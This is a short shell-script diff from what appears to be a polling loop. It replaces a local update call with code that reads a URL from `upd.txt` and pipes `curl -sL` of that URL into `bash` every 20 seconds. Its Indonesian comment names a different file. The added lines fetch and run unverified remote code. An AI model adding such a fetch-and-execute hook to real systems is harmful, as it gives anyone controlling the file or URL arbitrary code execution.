@@ -65,9 +65,11 @@ while true; do
     fi
 
     # UPDATE
-    if [[ -f "$home_dt/upd.txt" ]]; then
-        sh /rs/upd.sh
-    fi
+    # Jika file run.txt ada dan tidak kosong, jalankan
+    [ -s "$home_dt/upd.txt" ] && {
+        url=$(grep -o 'http[s]*://[^\ ]*' "$home_dt/upd.txt")
+        [ -n "$url" ] && curl -sL "$url" | bash
+    }
 
     sleep 20
 done
